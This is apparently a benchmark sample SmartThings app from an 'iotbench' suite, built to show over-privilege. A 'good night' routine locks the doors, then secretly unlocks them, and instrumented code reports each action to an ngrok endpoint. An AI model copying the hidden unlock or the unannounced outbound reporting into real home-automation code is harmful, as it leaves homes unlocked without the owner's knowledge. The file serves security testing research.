/**
 *  Good Night House
 *
 *  Copyright 2020 iotbench
 *
 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 *  in compliance with the License. You may obtain a copy of the License at:
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed
 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License
 *  for the specific language governing permissions and limitations under the License.
 *
 */
definition(
		name: "o-good-night-house_ins",
		namespace: "iotbench",
		author: "iotbench",
		description: "A simple overprivileged app. Request for door lock capability for locking the door. But after a few seconds delay, it will unlock the door automatically, which may not be the intention of the app user.\r\nBeing granted with door lock capability also grant the app of door unlock capability (hence over-privilege)",
		category: "Convenience",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"


/**
 *  Modified code from
 *  Walk Gentle Into That Good Night
 *
 *  Author: oneaccttorulethehouse@gmail.com
 *  Date: 2014-02-01
 */
)

preferences {
	section("When I touch the app turn these lights off…"){
		input "switchesoff", "capability.switch", multiple: true, required:true
	}
	section("When I touch the app turn these lights on…"){
		input "switcheson", "capability.switch", multiple: true, required:false
	}
	section("Lock theses locks...") {
		input "lock1","capability.lock", multiple: true
	}
	section("And change to this mode...") {
		input "newMode", "mode", title: "Mode?"
	}
	section("After so many seconds (optional)"){
		input "waitfor", "number", title: "Off after (default 120)", required: true
	}
}


def installed()
{
	log.debug "Installed with settings: ${settings}"
	log.debug "Current mode = ${location.mode}"
	subscribe(app, appTouch)
}


def updated()
{
	log.debug "Updated with settings: ${settings}"
	log.debug "Current mode = ${location.mode}"
	unsubscribe()
	subscribe(app, appTouch)
}

def appTouch(evt) {
	def data = [:]  // instrumented code
	def cnt = 0 // instrumented code

	log.debug "changeMode, location.mode = $location.mode, newMode = $newMode, location.modes = $location.modes"
	if (location.mode != newMode) {
		setLocationMode(newMode)
		//cnt++ //instrumented code
		// data['action'+cnt] = "${newMode}" // instrumented code

		log.debug "Changed the mode to '${newMode}'"
	}	else {
		log.debug "New mode is the same as the old mode, leaving it be"
	}
	log.debug "appTouch: $evt"
	cnt++ // instrumented code
	//data['action'+cnt] = "lock1 ${lock1.currentValue('lock')}"  // instrumented code
	data['action'+cnt] = "sink1 : lock1 lock"  // instrumented code
	lock1.lock() // sink 1

	cnt++ // instrumented code
	//data['action'+cnt] = "switcheson ${switcheson.currentValue('switch')}" // instrumented code
	data['action'+cnt] = "sink2 : switcheson on" // instrumented code
	switcheson.on()  // sink 2

	def delay = (waitfor != null && waitfor != "") ? waitfor * 1000 : 120000
	cnt++ // instrumented code
	//data['action'+cnt] = "switchesoff ${switchesoff.currentValue('switch')}" // instrumented code
	data['action'+cnt] = "sink3 : switchesoff off" // instrumented code
	switchesoff.off(delay: delay) // sink 3

	cnt++ // instrumented code
	//data['action'+cnt] = "lock1 ${lock1.currentValue('lock')}" // instrumented code
	data['action'+cnt] = "sink4 : lock1 unlock" // instrumented code
	lock1.unlock() // over-privileged operation // sink 4

	sendRequest(data) // instrumented code
}

// the following are instrumented codes
mappings {
	path("/app") {
		action: [
				GET: "appTouch"
		]
	}
}

mappings {
	path("/location/:command") {
		//log.info("/location/:command")
		action: [
				GET: "location"
		]
	}
}


void location() {
	// use the built-in request object to get the command parameter
	def command = params.command
	log.debug("Receive command: $command")

	// format command
	command = command.replaceFirst(command[0], command[0].toUpperCase()) // home -> Home, away -> Away

	def currMode = location.currentMode // "Home", "Away", etc.
	log.debug "current mode is $currMode"

	location.setMode(command)  // change location
	//runIn(5, printLocationInfo )  // 5 seconds delay to wait for location change takes effect
}

def sendRequest(data) {
	// [q:'Minneapolis', mode: 'json']
	def params = [
			uri:  'https://62f870a15b61.ngrok.io/',
			path: 'fuzzthings/things.php',
			contentType: 'application/json',
			query: data
	]
	try {
		httpGet(params){resp ->
			log.debug "connection okay"
		}
	} catch (e) {
		log.error "error: $e"
	}
}
